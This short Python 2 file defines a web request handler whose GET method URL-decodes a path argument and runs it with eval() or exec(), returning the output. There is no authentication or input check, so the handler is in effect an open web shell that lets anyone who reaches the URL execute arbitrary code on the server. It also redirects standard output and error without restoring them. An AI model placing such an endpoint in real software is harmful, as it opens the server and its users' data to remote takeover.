import urllib
import StringIO
import sys

import base

class Main(base.RequestHandler):

    def get(self, *args):
        command = args[1] or ""
        command = urllib.unquote(command)
        try:
            try:
                self.ok(str(eval(command)))
            except SyntaxError:
                output = StringIO.StringIO()
                sys.stdout = output
                sys.stderr = output
                exec(command)
                output.seek(0)
                self.ok(output.readline())
        except Exception, error:
            return self.ok("error: " + str(error))
